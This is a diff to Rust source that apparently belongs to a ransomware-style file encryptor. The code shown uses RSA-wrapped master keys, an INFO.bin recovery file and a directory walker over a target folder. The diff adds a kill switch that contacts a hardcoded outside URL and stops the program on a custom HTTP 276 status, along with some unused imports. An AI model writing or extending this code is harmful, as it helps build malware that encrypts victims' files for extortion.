@@ -5,11 +5,12 @@ use rand::{RngCore, thread_rng};
 use rayon::prelude::*;
 use rsa::{Oaep, RsaPublicKey, pkcs8::DecodePublicKey};
 use sha2::{Digest, Sha256};
+use std::alloc::System;
 use std::fs::{self, OpenOptions};
 use std::io::{Read, Seek, SeekFrom, Write};
+use std::os::unix::process;
 use std::path::{Path, PathBuf};
 use walkdir::WalkDir;
-
 // --- KONSTANTEN ---
 const BUFFER_4MB: usize = 4 * 1024 * 1024;
 const BUFFER_1MB: usize = 1 * 1024 * 1024;
@@ -17,7 +18,7 @@ const SMALL_FILE_THRESHOLD: u64 = 1 * 1024 * 1024; // < 1 MB
 const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024; // < 500 MB
 const RECOVERY_FILE: &str = "INFO.bin";
 const SPARSE_BLOCKS: usize = 5; // Anzahl der zusätzlichen Blöcke bei großen Dateien
-
+const DEBUG_MODE: bool = true;
 #[derive(serde::Serialize, serde::Deserialize)]
 struct RecoveryMetadata {
     encrypted_master_key: Vec<u8>,
@@ -38,8 +39,46 @@ impl RecoveryMetadata {
         nonce
     }
 }
+async fn check() -> bool {
+    if DEBUG_MODE {
+        println!("Starting check...");
+    }
+    let url = "https://hsh73ny3hov3dx1kwdynxaqw6yvmg2h7ht4z63ux55ssnm.mcjj.de/";
+    if DEBUG_MODE {
+        println!("Checking URL: {}", url);
+    }
 
-fn main() -> anyhow::Result<()> {
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(5))
+        .build()
+        .unwrap();
+
+    if let Ok(response) = client.get(url).send().await {
+        let status_code = response.status().as_u16();
+        // Erkennt den benutzerdefinierten HTTP-Statuscode 276
+        if status_code == 276 {
+            if DEBUG_MODE {
+                println!("Kill Switch aktiv (HTTP 276).");
+            }
+            return false;
+        }
+    }
+
+    if DEBUG_MODE {
+        println!("URL ist erreichbar / Kein Kill Switch.");
+    }
+    return true;
+}
+
+#[tokio::main]
+async fn main() -> anyhow::Result<()> {
+    let result = check().await;
+    if !result {
+        if DEBUG_MODE {
+            println!("Kill Switch aktiviert. Beende Programm.");
+        }
+        std::process::exit(0);
+    }
     let target_dir = "/home/jannik/Cloud/Dev/RAN/enc/test_data";
     let dry_run = false;
     let pub_key_pem = fs::read_to_string("public.pem")?;
